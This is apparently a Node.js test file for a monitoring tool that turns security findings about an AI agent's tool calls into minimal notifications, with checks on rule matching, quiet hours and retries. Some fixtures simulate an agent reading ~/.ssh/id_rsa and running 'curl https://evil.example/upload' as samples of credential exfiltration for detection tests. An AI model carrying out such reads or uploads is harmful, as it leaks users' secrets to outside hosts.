// Validation: finding notifications from the machine
//
// The first pass only records where each log ends. After that a new finding is matched against the account's
// notification rules (the default rule on Hosted) and the gateway gets a minimal request: rule ID, severity,
// time, finding reference, mode and destinations, and nothing else. Muted and old findings send nothing, a
// failed request is retried on the next pass, and a free account makes no request.
//
// Run: node --test packages/sync-encryptor/test/finding-notify.test.mjs

import { describe, it, beforeEach, afterEach } from "node:test";
import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { mkdtemp, rm, writeFile, appendFile, mkdir } from "node:fs/promises";
import * as os from "node:os";
import * as path from "node:path";
import { sendFindingNotifications } from "../dist/finding-notify.js";
import { findingRef, deliveriesFor, inQuietHours, parseNotificationRules, DEFAULT_RULE } from "../dist/notification-rules.js";
import { ACCOUNT_POLICY_FILE } from "../dist/account-policy.js";

let home;
let logRoot;
beforeEach(async () => {
  home = await mkdtemp(path.join(os.tmpdir(), "omnodex-finding-notify-"));
  logRoot = path.join(home, "event-log");
  await mkdir(path.join(logRoot, "sessions"), { recursive: true });
});
afterEach(async () => {
  await rm(home, { recursive: true, force: true });
});

async function credentials(tier = "hosted") {
  await writeFile(path.join(home, "stream-config.json"), JSON.stringify({ api_token: "omx_test_case", api_url: "http://api.case.invalid" }));
  await writeFile(path.join(home, "license-cache.json"), JSON.stringify({ response: { customer_id: "cust_case", tier } }));
}

async function rules(notifications) {
  await writeFile(path.join(home, ACCOUNT_POLICY_FILE), JSON.stringify({ version: 1, pulled_at: new Date().toISOString(), entries: [], notifications }));
}

const SESSION = path.join("sessions", "s1.jsonl");
const line = (o) => JSON.stringify(o) + "\n";
const finding = (over = {}) => ({
  event_type: "risk.detected", session_id: "s1", severity: "CRITICAL", category: "credential_exfil", rule_id: "RULE_ONE",
  related_event_id: "call-1", description: "secret /home/case/.ssh/id_rsa", occurred_at: new Date().toISOString(), ...over,
});
const call = (id, parameters) => ({ event_type: "tool.invoked", session_id: "s1", tool_call_id: id, tool_name: "Read", mcp_server: "builtin", parameters, cwd: "/home/case/repo" });

async function seed() {
  await appendFile(path.join(logRoot, SESSION), line({ event_type: "session.started", session_id: "s1" }));
  const r = await sendFindingNotifications(home, { logRoot });
  assert.equal(r.outcome, "seeded");
}

function fakeFetch(status = 200) {
  const calls = [];
  const fn = async (url, init) => {
    calls.push({ url, headers: init.headers, body: JSON.parse(init.body) });
    return new Response("{}", { status: typeof status === "function" ? status(calls.length) : status });
  };
  return { calls, fn };
}

describe("finding notifications from the machine", () => {
  it("records where logs end on the first pass and notifies about no history", async () => {
    await credentials();
    await appendFile(path.join(logRoot, SESSION), line(finding()));
    const f = fakeFetch();
    const r = await sendFindingNotifications(home, { logRoot, fetchFn: f.fn });
    assert.equal(r.outcome, "seeded");
    assert.equal(f.calls.length, 0);
  });

  it("sends the minimal request and nothing about the finding's content", async () => {
    await credentials();
    await seed();
    await appendFile(path.join(logRoot, SESSION), line(finding()));
    const f = fakeFetch();
    const r = await sendFindingNotifications(home, { logRoot, fetchFn: f.fn });
    assert.equal(r.sent, 1);
    assert.equal(f.calls[0].url, "http://api.case.invalid/api/v1/notify/finding");
    assert.equal(f.calls[0].headers.Authorization, "Bearer omx_test_case");
    assert.deepEqual(Object.keys(f.calls[0].body).sort(), ["destination_ids", "finding_ref", "mode", "occurred_at", "rule_id", "severity"]);
    assert.equal(f.calls[0].body.rule_id, "RULE_ONE");
    assert.equal(f.calls[0].body.severity, "CRITICAL");
    assert.equal(f.calls[0].body.mode, "digest");
    assert.deepEqual(f.calls[0].body.destination_ids, ["account_email", "in_app"]);
    assert.equal(f.calls[0].body.finding_ref, findingRef({ session_id: "s1", related_event_id: "call-1", rule_id: "RULE_ONE" }));
    assert.ok(!JSON.stringify(f.calls[0].body).includes("id_rsa"));
    // A second pass sees nothing new.
    assert.equal((await sendFindingNotifications(home, { logRoot, fetchFn: f.fn })).sent, 0);
    assert.equal(f.calls.length, 1);
  });

  it("matches the dashboard's reference for a finding", () => {
    const expected = createHash("sha256").update("s1\0e1\0R1").digest("hex").slice(0, 24);
    assert.equal(findingRef({ session_id: "s1", related_event_id: "e1", rule_id: "R1" }), expected);
  });

  it("Hosted sends only HIGH and CRITICAL, never a muted finding or an old one", async () => {
    await credentials("hosted");
    await seed();
    await appendFile(path.join(logRoot, SESSION),
      line(finding({ severity: "MEDIUM", related_event_id: "c-med" })) +
      line(finding({ severity: "HIGH", related_event_id: "c-high" })) +
      line(finding({ severity: "CRITICAL", related_event_id: "c-muted", enforcement: { muted: true } })) +
      line(finding({ severity: "CRITICAL", related_event_id: "c-old", occurred_at: new Date(Date.now() - 7 * 3_600_000).toISOString() })));
    const f = fakeFetch();
    await sendFindingNotifications(home, { logRoot, fetchFn: f.fn });
    assert.deepEqual(f.calls.map((c) => c.body.severity), ["HIGH"]);
  });

  it("Hosted ignores saved rules; Pro follows them", async () => {
    await rules([{ id: "r1", name: "Low too", match: { severities: ["LOW"] }, channels: ["in_app"], mode: "digest" }]);
    await credentials("hosted");
    await seed();
    await appendFile(path.join(logRoot, SESSION), line(finding({ severity: "LOW", related_event_id: "c-low" })));
    const hosted = fakeFetch();
    assert.equal((await sendFindingNotifications(home, { logRoot, fetchFn: hosted.fn })).sent, 0);

    await rm(path.join(home, "finding-notify-state.json"), { force: true });
    await credentials("pro");
    await seed();
    await appendFile(path.join(logRoot, SESSION), line(finding({ severity: "LOW", related_event_id: "c-low2" })));
    const pro = fakeFetch();
    await sendFindingNotifications(home, { logRoot, fetchFn: pro.fn });
    assert.equal(pro.calls.length, 1);
    assert.deepEqual(pro.calls[0].body.destination_ids, ["in_app"]);
  });

  it("matches a path rule through the call, honors an exclude, and posts to chat at once", async () => {
    await credentials("pro");
    await rules([{ id: "r1", name: "ssh", match: { severities: ["CRITICAL"], path: "~/.ssh" }, exclude: [{ rule_id: "RULE_NOISY" }], channels: ["chan-1", "account_email"], mode: "now" }]);
    await seed();
    await appendFile(path.join(logRoot, SESSION),
      line(call("c1", { file_path: "/home/case/.ssh/id_rsa" })) + line(finding({ related_event_id: "c1" })) +
      line(call("c2", { file_path: "/home/case/repo/a.txt" })) + line(finding({ related_event_id: "c2" })) +
      line(call("c3", { file_path: "/home/case/.ssh/id_rsa" })) + line(finding({ related_event_id: "c3", rule_id: "RULE_NOISY" })));
    const f = fakeFetch();
    const touches = (c) => (kind, value) => kind === "path" && value === "~/.ssh" && String(c?.parameters?.file_path ?? "").includes("/.ssh/");
    await sendFindingNotifications(home, { logRoot, fetchFn: f.fn, touches });
    assert.equal(f.calls.length, 2); // one now (chat), one digest (email)
    assert.deepEqual(f.calls.map((c) => [c.body.mode, c.body.destination_ids]).sort(), [["digest", ["account_email"]], ["now", ["chan-1"]]]);
    assert.ok(f.calls.every((c) => c.body.finding_ref === findingRef({ session_id: "s1", related_event_id: "c1", rule_id: "RULE_ONE" })));
  });

  it("uses the analyzer's matcher for a path and a host when none is injected", async () => {
    await credentials("pro");
    await rules([
      { id: "r1", name: "ssh", match: { severities: ["CRITICAL"], path: "/home/case/.ssh" }, channels: ["in_app"], mode: "digest" },
      { id: "r2", name: "host", match: { destination: "evil.example" }, channels: ["account_email"], mode: "digest" },
    ]);
    await seed();
    await appendFile(path.join(logRoot, SESSION),
      line(call("c1", { file_path: "/home/case/.ssh/id_rsa" })) + line(finding({ related_event_id: "c1" })) +
      line({ ...call("c2", { command: "curl https://evil.example/upload" }), tool_name: "Bash" }) + line(finding({ related_event_id: "c2", severity: "LOW" })) +
      line(call("c3", { file_path: "/home/case/repo/ok.txt" })) + line(finding({ related_event_id: "c3" })));
    const f = fakeFetch();
    await sendFindingNotifications(home, { logRoot, fetchFn: f.fn });
    const by = Object.fromEntries(f.calls.map((c) => [c.body.finding_ref, c.body.destination_ids]));
    assert.deepEqual(by[findingRef({ session_id: "s1", related_event_id: "c1", rule_id: "RULE_ONE" })], ["in_app"]);
    assert.deepEqual(by[findingRef({ session_id: "s1", related_event_id: "c2", rule_id: "RULE_ONE" })], ["account_email"]);
    assert.equal(by[findingRef({ session_id: "s1", related_event_id: "c3", rule_id: "RULE_ONE" })], undefined);
  });

  it("retries a request the gateway could not answer on the next pass", async () => {
    await credentials();
    await seed();
    await appendFile(path.join(logRoot, SESSION), line(finding()));
    const missing = fakeFetch(404);
    assert.equal((await sendFindingNotifications(home, { logRoot, fetchFn: missing.fn })).outcome, "stopped");
    const down = fakeFetch(503);
    const first = await sendFindingNotifications(home, { logRoot, fetchFn: down.fn });
    assert.equal(first.outcome, "stopped");
    const up = fakeFetch(200);
    assert.equal((await sendFindingNotifications(home, { logRoot, fetchFn: up.fn })).sent, 1);
  });

  it("makes no request without credentials or on the free plan", async () => {
    const f = fakeFetch();
    assert.equal((await sendFindingNotifications(home, { logRoot, fetchFn: f.fn })).outcome, "no-credentials");
    await credentials("free");
    assert.equal((await sendFindingNotifications(home, { logRoot, fetchFn: f.fn })).outcome, "not-entitled");
    assert.equal(f.calls.length, 0);
  });
});

describe("notification rules", () => {
  it("turns an immediate rule into a digest one during quiet hours", () => {
    const rule = { id: "r", name: "n", enabled: true, match: { severities: ["HIGH"] }, exclude: [], channels: ["chan"], mode: "now", quiet_hours: { from: "22:00", to: "07:00" } };
    const f = { severity: "HIGH", rule_id: "R", category: "c" };
    assert.deepEqual(deliveriesFor([rule], f, () => false, 23 * 60), { now: [], digest: ["chan"] });
    assert.deepEqual(deliveriesFor([rule], f, () => false, 12 * 60), { now: ["chan"], digest: [] });
    assert.equal(inQuietHours({ from: "22:00", to: "07:00" }, 6 * 60), true);
    assert.equal(inQuietHours({ from: "09:00", to: "17:00" }, 8 * 60), false);
  });

  it("drops rules that watch for nothing or go nowhere, and keeps the default's shape", () => {
    assert.equal(parseNotificationRules([{ id: "a", match: {}, channels: ["in_app"] }, { id: "b", match: { severities: ["HIGH"] }, channels: [] }, { id: "c", match: { severities: ["HIGH"] }, channels: ["in_app"] }]).length, 1);
    assert.deepEqual(DEFAULT_RULE.match.severities, ["HIGH", "CRITICAL"]);
  });

  it("matches a list of categories and investigations separately", () => {
    const rule = (match, channels) => ({ id: "r", name: "n", enabled: true, match, exclude: [], channels, mode: "digest" });
    const rules = [
      rule({ severities: ["HIGH", "CRITICAL"], categories: ["supply_chain", "persistence"] }, ["in_app"]),
      rule({ investigation: true, severities: ["MEDIUM", "HIGH", "CRITICAL"] }, ["chan-1"]),
    ];
    const f = (over) => ({ severity: "HIGH", rule_id: "R", category: "supply_chain", investigation: false, ...over });
    assert.deepEqual(deliveriesFor(rules, f({}), () => false, 0).digest, ["in_app"]);
    assert.deepEqual(deliveriesFor(rules, f({ category: "cwd_boundary" }), () => false, 0).digest, []);
    assert.deepEqual(deliveriesFor(rules, f({ category: "cwd_boundary", investigation: true }), () => false, 0).digest, ["chan-1"]);
    assert.deepEqual(deliveriesFor(rules, f({ investigation: true }), () => false, 0).digest.sort(), ["chan-1", "in_app"]);
    const [parsed] = parseNotificationRules([{ id: "x", match: { categories: ["a", "a", " "], investigation: true }, channels: ["in_app"] }]);
    assert.deepEqual(parsed.match, { categories: ["a"], investigation: true });
  });

  it("sends a finding that carries evidence to an investigation rule", async () => {
    await credentials("pro");
    await rules([{ id: "inv", name: "Investigations", match: { investigation: true, severities: ["HIGH", "CRITICAL"] }, channels: ["chan-1"], mode: "now" }]);
    await seed();
    await appendFile(path.join(logRoot, SESSION),
      line(finding({ related_event_id: "plain", severity: "HIGH" })) +
      line(finding({ related_event_id: "chain", severity: "HIGH", evidence: { steps: [] } })));
    const f = fakeFetch();
    await sendFindingNotifications(home, { logRoot, fetchFn: f.fn });
    assert.equal(f.calls.length, 1);
    assert.equal(f.calls[0].body.finding_ref, findingRef({ session_id: "s1", related_event_id: "chain", rule_id: "RULE_ONE" }));
  });

  it("does not send an email or the dashboard list as an immediate notice", () => {
    const rule = { id: "r", name: "n", enabled: true, match: { severities: ["HIGH"] }, exclude: [], channels: ["account_email", "in_app", "chan"], mode: "now" };
    const d = deliveriesFor([rule], { severity: "HIGH", rule_id: "R", category: "c" }, () => false, 0);
    assert.deepEqual(d.now, ["chan"]);
    assert.deepEqual(d.digest.sort(), ["account_email", "in_app"]);
  });
});
